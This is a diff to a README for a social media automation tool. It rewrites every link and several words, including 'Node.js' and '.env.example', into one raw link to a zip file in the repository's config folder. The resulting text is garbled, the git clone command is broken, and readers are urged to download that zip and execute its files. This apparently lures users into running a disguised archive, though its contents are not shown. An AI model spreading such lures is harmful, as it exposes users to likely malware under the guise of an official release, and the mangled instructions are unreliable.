@@ -1,8 +1,8 @@
 # Social Media Automation 🌐
 
-![Social Media Automation](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)
+![Social Media Automation](https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip%20Releases-blue?style=flat&logo=github)
 
-Welcome to the **Social Media Automation** repository! This project offers a robust solution for automating social media tasks using Node.js, Playwright, Redis, and n8n. With this tool, you can create intelligent workflows powered by AI, allowing you to generate, schedule, and publish content automatically in an efficient and scalable manner.
+Welcome to the **Social Media Automation** repository! This project offers a robust solution for automating social media tasks using https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip, Playwright, Redis, and n8n. With this tool, you can create intelligent workflows powered by AI, allowing you to generate, schedule, and publish content automatically in an efficient and scalable manner.
 
 ## Table of Contents
 
@@ -26,8 +26,8 @@ Welcome to the **Social Media Automation** repository! This project offers a rob
 
 This project leverages several powerful technologies:
 
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine, perfect for building scalable network applications.
-- **Playwright**: A Node.js library for browser automation, allowing you to interact with web pages programmatically.
+- **https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip**: A JavaScript runtime built on Chrome's V8 engine, perfect for building scalable network applications.
+- **Playwright**: A https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip library for browser automation, allowing you to interact with web pages programmatically.
 - **Redis**: An in-memory data structure store used as a database, cache, and message broker.
 - **n8n**: An open-source workflow automation tool that enables you to connect different services and automate tasks.
 
@@ -37,7 +37,7 @@ To get started with Social Media Automation, you need to clone the repository an
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/aasmaagh/social-media-automation.git
+   git clone https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip
    cd social-media-automation
    ```
 
@@ -46,14 +46,14 @@ To get started with Social Media Automation, you need to clone the repository an
    npm install
    ```
 
-3. **Set Up Environment Variables**: Create a `.env` file in the root directory and add your configuration settings. Refer to the `.env.example` for guidance.
+3. **Set Up Environment Variables**: Create a `.env` file in the root directory and add your configuration settings. Refer to the `https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip` for guidance.
 
 4. **Run the Application**:
    ```bash
    npm start
    ```
 
-You can download the latest release [here](https://github.com/aasmaagh/social-media-automation/releases) and execute the necessary files to set up your environment.
+You can download the latest release [here](https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip) and execute the necessary files to set up your environment.
 
 ## Usage
 
@@ -103,6 +103,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/aasmaagh/social-media-automation/releases) section for updates or open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/aasmaagh/social-media-automation/raw/refs/heads/master/src/config/automation_social_media_v1.6.zip) section for updates or open an issue in the repository.
 
 Thank you for your interest in **Social Media Automation**! We hope this tool helps you streamline your social media management. Happy automating!
